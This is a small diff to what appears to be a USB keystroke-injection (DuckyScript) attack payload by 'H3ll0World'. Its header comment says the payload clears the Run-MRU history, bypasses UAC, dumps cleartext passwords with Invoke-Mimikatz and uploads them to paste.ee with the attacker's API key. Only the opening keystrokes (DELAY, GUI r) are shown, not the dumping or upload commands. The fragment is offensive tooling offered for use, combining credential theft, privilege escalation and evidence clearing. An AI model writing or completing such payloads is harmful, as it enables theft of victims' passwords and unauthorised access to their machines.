@@ -1,5 +1,6 @@
-REM Invoke a payload which clean the last Run-MRU command, bypass the uac, dump the clear text passwords using Invoke-Mimikatz PS Module and finally upload them to paste.ee
 REM Author: H3ll0World
+REM Description: Invoke a payload which clean the last Run-MRU command, bypass the uac, dump the clear text passwords using Invoke-Mimikatz PS Module and finally upload them to paste.ee
+REM Requirements: Create an account in paste.ee to get your apikey.
 DELAY 1000
 GUI r
 DELAY 100
